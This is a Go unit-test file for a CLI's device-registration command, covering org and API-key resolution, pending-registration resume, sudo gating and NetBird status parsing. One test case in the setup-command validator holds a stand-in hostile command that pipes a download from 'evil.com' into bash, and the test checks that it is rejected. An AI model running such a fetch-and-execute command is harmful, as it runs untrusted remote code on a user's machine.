package register

import (
	"context"
	"errors"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"

	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
	nodev1 "buf.build/gen/go/brevdev/devplane/protocolbuffers/go/devplaneapi/v1"
	"connectrpc.com/connect"

	"github.com/brevdev/brev-cli/pkg/auth"
	"github.com/brevdev/brev-cli/pkg/entity"
	"github.com/brevdev/brev-cli/pkg/externalnode"
	"github.com/brevdev/brev-cli/pkg/sudo"
	"github.com/brevdev/brev-cli/pkg/terminal"
)

// mockRegisterStore satisfies RegisterStore for orchestration tests.
type mockRegisterStore struct {
	user  *entity.User
	org   *entity.Organization
	orgs  []entity.Organization
	token string
	err   error
}

func (m *mockRegisterStore) GetCurrentUser() (*entity.User, error) {
	if m.err != nil {
		return nil, m.err
	}
	return m.user, nil
}

func (m *mockRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	return m.org, nil
}

func (m *mockRegisterStore) GetOrganizationsByName(name string) ([]entity.Organization, error) {
	var matched []entity.Organization
	for _, o := range m.orgs {
		if o.Name == name {
			matched = append(matched, o)
		}
	}
	if len(matched) == 0 && m.org != nil && m.org.Name == name {
		matched = append(matched, *m.org)
	}
	return matched, nil
}

func (m *mockRegisterStore) ListOrganizations() ([]entity.Organization, error) {
	if len(m.orgs) > 0 {
		return m.orgs, nil
	}
	if m.org != nil {
		return []entity.Organization{*m.org}, nil
	}
	return nil, nil
}

func (m *mockRegisterStore) GetAccessToken() (string, error) { return m.token, nil }

// mockRegistrationStore satisfies RegistrationStore for orchestration tests.
type mockRegistrationStore struct {
	reg *DeviceRegistration
}

func (m *mockRegistrationStore) Save(reg *DeviceRegistration) error {
	m.reg = reg
	return nil
}

func (m *mockRegistrationStore) Load() (*DeviceRegistration, error) {
	reg, err := m.LoadAll()
	if err != nil {
		return nil, err
	}
	if reg.ExternalNodeID == "" || reg.OrgID == "" {
		return nil, fmt.Errorf("device registration is incomplete")
	}
	return reg, nil
}

func (m *mockRegistrationStore) LoadAll() (*DeviceRegistration, error) {
	if m.reg == nil {
		return nil, fmt.Errorf("no registration")
	}
	return m.reg, nil
}

func (m *mockRegistrationStore) Delete() error {
	m.reg = nil
	return nil
}

func (m *mockRegistrationStore) Exists() (bool, error) {
	return m.reg != nil, nil
}

// mock types for registerDeps interfaces

type mockPlatform struct{ compatible bool }

func (m mockPlatform) IsCompatible() bool { return m.compatible }

type mockConfirmer struct{ confirm bool }

func (m mockConfirmer) ConfirmYesNo(_ string) bool { return m.confirm }

// mockSelector implements terminal.Selector by returning the first item (for tests that need org selection).
type mockSelector struct{ choice string }

func (m mockSelector) Select(_ string, items []string) string {
	if m.choice != "" {
		for _, s := range items {
			if s == m.choice {
				return s
			}
		}
	}
	if len(items) > 0 {
		return items[0]
	}
	return ""
}

type mockNetBirdManager struct{ err error }

func (m mockNetBirdManager) Install() error       { return m.err }
func (m mockNetBirdManager) Uninstall() error     { return m.err }
func (m mockNetBirdManager) EnsureRunning() error { return m.err }

type mockSetupRunner struct {
	called bool
	cmd    string
	err    error
}

func (m *mockSetupRunner) RunSetup(script string) error {
	m.called = true
	m.cmd = script
	return m.err
}

type mockNodeClientFactory struct {
	serverURL string
}

func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
	return NewNodeServiceClient(provider, m.serverURL)
}

// testHardwareProfile returns a realistic HardwareProfile for use in tests.
func testHardwareProfile() *HardwareProfile {
	cpuCount := int32(2)
	ramBytes := int64(131886028) * 1024
	memBytes := int64(131072) * 1024 * 1024
	return &HardwareProfile{
		Architecture: "arm64",
		OS:           "Ubuntu",
		OSVersion:    "24.04",
		GPUs: []GPU{
			{Model: "NVIDIA GB10", Count: 1, MemoryBytes: &memBytes},
		},
		CPUCount: &cpuCount,
		RAMBytes: &ramBytes,
		Storage: []StorageDevice{
			{Name: "nvme0n1", StorageBytes: 500107862016, StorageType: "SSD"},
		},
	}
}

// testRegisterDeps returns deps with all side effects stubbed out, and a fake
// ConnectRPC server backed by the provided fakeNodeService.
func testRegisterDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationStore) (registerDeps, *httptest.Server) {
	t.Helper()

	_, handler := nodev1connect.NewExternalNodeServiceHandler(svc)
	server := httptest.NewServer(handler)

	return registerDeps{
		platform:    mockPlatform{compatible: true},
		prompter:    mockConfirmer{confirm: true},
		selector:    mockSelector{},
		gater:       sudo.CachedGater{},
		netbird:     mockNetBirdManager{},
		setupRunner: &mockSetupRunner{},
		nodeClients: mockNodeClientFactory{serverURL: server.URL},
		hardwareProfiler: &mockHardwareProfiler{
			profile: testHardwareProfile(),
		},
		registrationStore: regStore,
	}, server
}

func testRegisterStore() *mockRegisterStore {
	return &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}
}

func testPendingReg(orgID, orgName, deviceID string) *DeviceRegistration {
	return &DeviceRegistration{
		DisplayName: "My Spark",
		OrgID:       orgID,
		OrgName:     orgName,
		DeviceID:    deviceID,
		Status:      RegistrationStatusPending,
	}
}

func registeredReg() *DeviceRegistration {
	return &DeviceRegistration{
		ExternalNodeID: "unode_existing",
		DisplayName:    "Existing",
		OrgID:          "org_123",
		DeviceID:       "dev-existing",
		Status:         RegistrationStatusRegistered,
	}
}

// okAddNodeFn echoes org/name/device and returns the standard success node.
func okAddNodeFn(captured *[]string) func(*nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
	return func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
		if captured != nil {
			*captured = append(*captured, req.GetOrganizationId())
		}
		return &nodev1.AddNodeResponse{
			ExternalNode: &nodev1.ExternalNode{
				ExternalNodeId: "unode_abc",
				OrganizationId: req.GetOrganizationId(),
				Name:           req.GetName(),
				DeviceId:       req.GetDeviceId(),
				ConnectivityInfo: &nodev1.ConnectivityInfo{
					RegistrationCommand: "netbird up --key abc",
				},
			},
		}, nil
	}
}

// runRegisterCase absorbs scaffolding tests repeat: deps, server
// lifecycle, terminal, and the invocation on the standard test store.
func runRegisterCase(t *testing.T, regStore RegistrationStore, svc *fakeNodeService, opts registerOpts) error {
	t.Helper()
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()
	return runRegister(context.Background(), terminal.New(), testRegisterStore(), opts, deps)
}

func Test_runRegister_HappyPath(t *testing.T) {
	regStore := &mockRegistrationStore{}
	var gotOrgs []string
	svc := &fakeNodeService{addNodeFn: okAddNodeFn(&gotOrgs)}

	setupRunner := &mockSetupRunner{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()
	deps.setupRunner = setupRunner

	err := runRegister(context.Background(), terminal.New(), testRegisterStore(),
		registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if len(gotOrgs) != 1 || gotOrgs[0] != "org_123" {
		t.Errorf("expected AddNode for org_123 once, got %v", gotOrgs)
	}
	reg, err := regStore.Load() // implies Exists
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.ExternalNodeID != "unode_abc" || reg.DisplayName != "my-spark" ||
		reg.OrgID != "org_123" || reg.Status != RegistrationStatusRegistered {
		t.Errorf("persisted registration mismatch: %+v", reg)
	}
	if setupRunner.cmd != "netbird up --key abc" {
		t.Errorf("expected setup command 'netbird up --key abc', got %q", setupRunner.cmd)
	}
}

// gaterFromFunc adapts a function to sudo.Gater; used only by Test_runRegister_UserCancels.
type gaterFromFunc func(*terminal.Terminal, terminal.Confirmer, string, bool) error

func (f gaterFromFunc) Gate(t *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
	return f(t, c, reason, assumeYes)
}

func Test_runRegister_UserCancels(t *testing.T) {
	// User cancel happens in interactive mode (sudo or confirm). Flag-driven has no prompts.
	regStore := &mockRegistrationStore{}
	store := testRegisterStore()
	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: false}
	// Use a gater that actually runs the confirmer so the test cancels at the gate
	// instead of proceeding to the device name prompt (CachedGater always passes).
	deps.gater = gaterFromFunc(func(_ *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
		if assumeYes {
			return nil
		}
		if !c.ConfirmYesNo(fmt.Sprintf("%s requires sudo. Continue?", reason)) {
			return fmt.Errorf("%s canceled by user", reason)
		}
		return nil
	})

	term := terminal.New()
	opts := registerOpts{interactive: true, name: "", orgName: ""}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when user declines sudo gate")
	}
	if !strings.Contains(err.Error(), "canceled by user") {
		t.Errorf("expected 'canceled by user' error, got: %v", err)
	}

	exists, _ := regStore.Exists()
	if exists {
		t.Error("registration should not exist after cancel")
	}
}

func Test_runRegister_AlreadyRegistered(t *testing.T) {
	tests := []struct {
		name      string
		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
	}{
		{
			name: "Connected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "Disconnected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "GetNodeFails",
			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, nil)
			},
		},
		{
			name: "NilConnectivityInfo",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
					},
				}, nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{reg: registeredReg()}

			store := testRegisterStore()

			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			// Pass the same name as the existing registration so we go through
			// the checkExistingRegistration path (not the different-name path).
			opts := registerOpts{interactive: false, name: "Existing", orgName: "TestOrg"}
			err := runRegister(context.Background(), term, store, opts, deps)
			if err != nil {
				t.Fatalf("expected nil error, got: %v", err)
			}

			exists, _ := regStore.Exists()
			if !exists {
				t.Error("expected registration to still exist")
			}
		})
	}
}

func Test_runRegister_WithOrgFlag(t *testing.T) {
	tests := []struct {
		name      string
		orgs      []entity.Organization
		orgName   string
		wantErr   string
		wantOrgID string
	}{
		{
			name:      "resolves org by name",
			orgs:      []entity.Organization{{ID: "org_456", Name: "SpecificOrg"}},
			orgName:   "SpecificOrg",
			wantOrgID: "org_456",
		},
		{
			name:    "org not found",
			orgs:    []entity.Organization{},
			orgName: "NonexistentOrg",
			wantErr: "no organization found",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}

			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				org:   &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
				orgs:  tt.orgs,
				token: "tok",
			}

			var gotOrgs []string
			svc := &fakeNodeService{addNodeFn: okAddNodeFn(&gotOrgs)}

			setupRunner := &mockSetupRunner{}
			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()
			deps.setupRunner = setupRunner

			term := terminal.New()
			opts := registerOpts{interactive: false, name: "my-spark", orgName: tt.orgName}
			err := runRegister(context.Background(), term, store, opts, deps)
			if tt.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("expected error containing %q, got: %v", tt.wantErr, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("runRegister with --org failed: %v", err)
			}
			if len(gotOrgs) != 1 || gotOrgs[0] != tt.wantOrgID {
				t.Errorf("expected AddNode org %s, got %v", tt.wantOrgID, gotOrgs)
			}

			reg, err := regStore.Load()
			if err != nil {
				t.Fatalf("Load failed: %v", err)
			}
			if reg.OrgID != tt.wantOrgID {
				t.Errorf("expected registration org %s, got %s", tt.wantOrgID, reg.OrgID)
			}
		})
	}
}

func Test_runRegister_AddNodeFailure(t *testing.T) {
	tests := []struct {
		name        string
		code        connect.Code
		errMsg      string
		wantPending bool // true: record stays for resume; false: record cleared
		wantErr     string
	}{
		{"Internal_StaysPending", connect.CodeInternal, "", true, ""},
		{"AlreadyExists_ClearsPending", connect.CodeAlreadyExists, "node with name my-spark already exists", false, "already exists"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			svc := &fakeNodeService{
				addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					return nil, connect.NewError(tt.code, errors.New(tt.errMsg))
				},
			}

			err := runRegisterCase(t, regStore, svc, registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"})
			if err == nil {
				t.Fatal("expected error on AddNode failure")
			}
			if tt.wantErr != "" && !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("expected error containing %q, got: %v", tt.wantErr, err)
			}

			exists, _ := regStore.Exists()
			if tt.wantPending != exists {
				t.Errorf("wantPending=%v but exists=%v", tt.wantPending, exists)
			}
			if !tt.wantPending {
				return
			}
			reg, err := regStore.LoadAll()
			if err != nil {
				t.Fatalf("Load failed: %v", err)
			}
			if reg.Status != RegistrationStatusPending || reg.DeviceID == "" {
				t.Errorf("pending record must carry a device ID for retry: status=%q device=%q", reg.Status, reg.DeviceID)
			}
		})
	}
}

func Test_runRegister_NoSetupCommand(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := testRegisterStore()

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
				// No ConnectivityInfo / RegistrationCommand
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if setupRunner.called {
		t.Error("setup command should not be called when empty")
	}
}

func Test_runSetupCommand_Validation(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectReject bool
	}{
		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := runSetupCommand(tt.cmd)
			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
			if tt.expectReject && !rejected {
				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
			}
			if !tt.expectReject && rejected {
				t.Errorf("expected command to be accepted, but got: %v", err)
			}
		})
	}
}

func Test_netbirdManagementConnected(t *testing.T) {
	connectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Connected
Signal: Connected
Relays: 3/3 Available
Nameservers: 0/0 Available
FQDN: client-3dbe844c.lp.local
NetBird IP: 100.108.207.143/16
Interface type: Kernel
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 3/4 Connected`

	disconnectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Disconnected
Signal: Disconnected
Relays: 0/2 Available
Nameservers: 0/0 Available
FQDN:
NetBird IP: N/A
Interface type: N/A
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 0/0 Connected`

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"Connected", connectedOutput, true},
		{"Disconnected", disconnectedOutput, false},
		{"EmptyString", "", false},
		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := netbirdManagementConnected(tt.input)
			if got != tt.want {
				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

func Test_runRegister_StepFailure(t *testing.T) {
	tests := []struct {
		name      string
		mutate    func(*registerDeps)
		errSubstr string
	}{
		{"PlatformIncompatible", func(d *registerDeps) { d.platform = mockPlatform{compatible: false} }, "only supported on Linux"},
		{"HardwareProfilerFailure", func(d *registerDeps) { d.hardwareProfiler = &mockHardwareProfiler{err: fmt.Errorf("nvml init failed")} }, "hardware profile"},
		{"NetBirdInstallFailure", func(d *registerDeps) { d.netbird = mockNetBirdManager{err: fmt.Errorf("install failed")} }, "tunnel setup failed"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			deps, server := testRegisterDeps(t, &fakeNodeService{}, &mockRegistrationStore{})
			defer server.Close()
			tt.mutate(&deps)

			opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
			err := runRegister(context.Background(), terminal.New(), testRegisterStore(), opts, deps)
			if err == nil {
				t.Fatal("expected error")
			}
			if !strings.Contains(err.Error(), tt.errSubstr) {
				t.Errorf("expected error containing %q, got: %v", tt.errSubstr, err)
			}
		})
	}
}

func Test_runRegister_NoNameNotRegistered(t *testing.T) {
	// In flag-driven mode, missing --name and --org must error (no prompts).
	regStore := &mockRegistrationStore{}

	store := testRegisterStore()

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "", orgName: ""}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no name/org in non-interactive mode")
	}
	if !strings.Contains(err.Error(), "non-interactive") || !strings.Contains(err.Error(), "--name") {
		t.Errorf("expected non-interactive/--name error, got: %v", err)
	}
}

func Test_runRegister_ResumesPendingRegistration(t *testing.T) {
	const pendingDeviceID = "device-uuid-pending"
	tests := []struct {
		name  string
		opts  registerOpts
		store func() *mockRegisterStore
	}{
		{
			name:  "interactive mode",
			opts:  registerOpts{interactive: true},
			store: testRegisterStore,
		},
		{
			name: "non-interactive with matching --org",
			opts: registerOpts{interactive: false, name: "My Spark", orgName: "TestOrg"},
			store: func() *mockRegisterStore {
				return &mockRegisterStore{
					user:  &entity.User{ID: "user_1"},
					orgs:  []entity.Organization{{ID: "org_123", Name: "TestOrg"}},
					token: "tok",
				}
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{reg: testPendingReg("org_123", "TestOrg", pendingDeviceID)}
			store := tt.store()

			var addNodeDeviceIDs []string
			svc := &fakeNodeService{
				addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					addNodeDeviceIDs = append(addNodeDeviceIDs, req.GetDeviceId())
					return &nodev1.AddNodeResponse{
						ExternalNode: &nodev1.ExternalNode{
							ExternalNodeId: "unode_abc",
							OrganizationId: req.GetOrganizationId(),
							Name:           req.GetName(),
							DeviceId:       req.GetDeviceId(),
							ConnectivityInfo: &nodev1.ConnectivityInfo{
								RegistrationCommand: "netbird up --key abc",
							},
						},
					}, nil
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			if err := runRegister(context.Background(), term, store, tt.opts, deps); err != nil {
				t.Fatalf("runRegister failed: %v", err)
			}

			if len(addNodeDeviceIDs) != 1 || addNodeDeviceIDs[0] != pendingDeviceID {
				t.Errorf("expected AddNode to reuse device ID %q once, got %v", pendingDeviceID, addNodeDeviceIDs)
			}

			reg, loadErr := regStore.LoadAll()
			if loadErr != nil {
				t.Fatalf("Load failed: %v", loadErr)
			}
			if reg.Status != RegistrationStatusRegistered {
				t.Errorf("expected status %q after resume, got %q", RegistrationStatusRegistered, reg.Status)
			}
			if reg.ExternalNodeID != "unode_abc" {
				t.Errorf("expected ExternalNodeID unode_abc, got %q", reg.ExternalNodeID)
			}
			if reg.DeviceID != pendingDeviceID {
				t.Errorf("expected device ID to remain %q, got %q", pendingDeviceID, reg.DeviceID)
			}
		})
	}
}

// --- API key org scoping ---

const testAPIKey = auth.BrevAPIKeyPrefix + "test-key"

func ensureNoAPIKeyEnv(t *testing.T) {
	t.Helper()
	t.Setenv(auth.APIKeyEnvVar, "")
}

func Test_resolveOrgForAPIKey(t *testing.T) {
	tests := []struct {
		name    string
		orgs    []entity.Organization
		orgName string
		wantID  string
		wantErr string
	}{
		{"single, name matches", []entity.Organization{{ID: "org_1", Name: "Alpha"}}, "Alpha", "org_1", ""},
		{"single, no name", []entity.Organization{{ID: "org_1", Name: "Alpha"}}, "", "org_1", ""},
		{"single, name mismatch", []entity.Organization{{ID: "org_1", Name: "Alpha"}}, "Beta", "", "does not belong to organization"},
		{"empty", nil, "", "", "api key invalid"},
		{"multiple, name matches one", []entity.Organization{{ID: "org_1", Name: "Alpha"}, {ID: "org_2", Name: "Beta"}}, "Beta", "", "api key invalid"},
		{"multiple, no name", []entity.Organization{{ID: "org_1", Name: "Alpha"}, {ID: "org_2", Name: "Beta"}}, "", "", "api key invalid"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s := &mockRegisterStore{orgs: tt.orgs}
			got, err := ResolveOrgForAPIKey(s, tt.orgName)
			if tt.wantErr != "" {
				if err == nil {
					t.Fatalf("expected error containing %q, got nil", tt.wantErr)
				}
				if !strings.Contains(err.Error(), tt.wantErr) {
					t.Errorf("expected error containing %q, got: %v", tt.wantErr, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got.ID != tt.wantID {
				t.Errorf("expected org ID %s, got %s", tt.wantID, got.ID)
			}
		})
	}
}

// API-key flows: mismatch rejects with guidance; no --org uses the key's org.
func Test_runRegister_APIKey(t *testing.T) {
	t.Setenv(auth.APIKeyEnvVar, testAPIKey)

	tests := []struct {
		name      string
		orgName   string
		wantErr   string
		wantOrgID string // AddNode must receive this org
	}{
		{"org flag mismatch rejects", "OtherOrg", "does not belong to organization", ""},
		{"no org flag uses key org", "", "", "org_123"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			var gotOrgs []string
			svc := &fakeNodeService{addNodeFn: okAddNodeFn(&gotOrgs)}

			err := runRegisterCase(t, regStore, svc, registerOpts{interactive: false, name: "my-spark", orgName: tt.orgName})

			if tt.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("expected error containing %q, got: %v", tt.wantErr, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("runRegister failed: %v", err)
			}
			if len(gotOrgs) != 1 || gotOrgs[0] != tt.wantOrgID {
				t.Errorf("expected AddNode org %s, got %v", tt.wantOrgID, gotOrgs)
			}
		})
	}
}

func Test_runRegister_OrgMismatch(t *testing.T) {
	tests := []struct {
		name        string
		status      string
		useAPIKey   bool   // set BREV_API_KEY for the new org
		useOrgFlag  bool   // pass --org for the new org
		wantWording string // pending -> "incomplete registration"; registered -> "already registered"
	}{
		{"APIKey_Pending", RegistrationStatusPending, true, false, "incomplete registration"},
		{"OrgFlag_Pending", RegistrationStatusPending, false, true, "incomplete registration"},
		{"APIKey_AlreadyRegistered", RegistrationStatusRegistered, true, false, "already registered"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ensureNoAPIKeyEnv(t)
			if tt.useAPIKey {
				t.Setenv(auth.APIKeyEnvVar, testAPIKey)
			}
			reg := registeredReg()
			reg.OrgID, reg.OrgName, reg.Status = "org_other", "OtherOrg", tt.status
			regStore := &mockRegistrationStore{reg: reg}
			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				orgs:  []entity.Organization{{ID: "org_123", Name: "TestOrg"}}, // new org
				token: "tok",
			}

			var addNodeCalls int
			svc := &fakeNodeService{
				addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					addNodeCalls++
					return nil, fmt.Errorf("AddNode should not be called on org mismatch")
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			opts := registerOpts{interactive: false, name: "My Spark", orgName: "TestOrg"}
			err := runRegister(context.Background(), term, store, opts, deps)
			if err == nil {
				t.Fatal("expected error on org mismatch")
			}
			for _, want := range []string{"deregister", tt.wantWording, "org_other", "org_123"} {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("expected error to contain %q, got: %v", want, err)
				}
			}
			if addNodeCalls != 0 {
				t.Errorf("AddNode must not be called on mismatch, got %d", addNodeCalls)
			}
		})
	}
}

func Test_runRegister_ResumeAddNodeFails_StaysPending(t *testing.T) {
	const pendingDeviceID = "device-uuid-pending"
	regStore := &mockRegistrationStore{reg: testPendingReg("org_123", "TestOrg", pendingDeviceID)}

	var addNodeCalls int
	svc := &fakeNodeService{
		addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			addNodeCalls++
			return nil, connect.NewError(connect.CodeInternal, nil)
		},
	}

	err := runRegisterCase(t, regStore, svc, registerOpts{interactive: true})
	if err == nil {
		t.Fatal("expected error when AddNode fails during resume")
	}
	if addNodeCalls != 1 {
		t.Fatalf("expected AddNode called once, got %d", addNodeCalls)
	}

	reg, err := regStore.LoadAll()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.Status != RegistrationStatusPending || reg.DeviceID != pendingDeviceID || reg.ExternalNodeID != "" {
		t.Errorf("pending record must survive with device ID intact: status=%q device=%q node=%q",
			reg.Status, reg.DeviceID, reg.ExternalNodeID)
	}
}

func Test_isAuthenticated(t *testing.T) {
	t.Run("api key short-circuits without GetCurrentUser", func(t *testing.T) {
		store := &mockRegisterStore{
			err: fmt.Errorf("GetCurrentUser must not be called when a key is present"),
		}
		if err := isAuthenticated(store, testAPIKey); err != nil {
			t.Fatalf("expected nil error with api key, got %v", err)
		}
	})

	t.Run("no api key verifies via GetCurrentUser", func(t *testing.T) {
		store := &mockRegisterStore{user: &entity.User{ID: "user_1"}}
		if err := isAuthenticated(store, ""); err != nil {
			t.Fatalf("expected nil error with valid user, got %v", err)
		}
	})

	t.Run("no api key and GetCurrentUser fails", func(t *testing.T) {
		store := &mockRegisterStore{err: fmt.Errorf("not logged in")}
		err := isAuthenticated(store, "")
		if err == nil {
			t.Fatal("expected error when GetCurrentUser fails")
		}
		if !strings.Contains(err.Error(), "not logged in") {
			t.Errorf("expected GetCurrentUser error propagated, got %v", err)
		}
	})
}
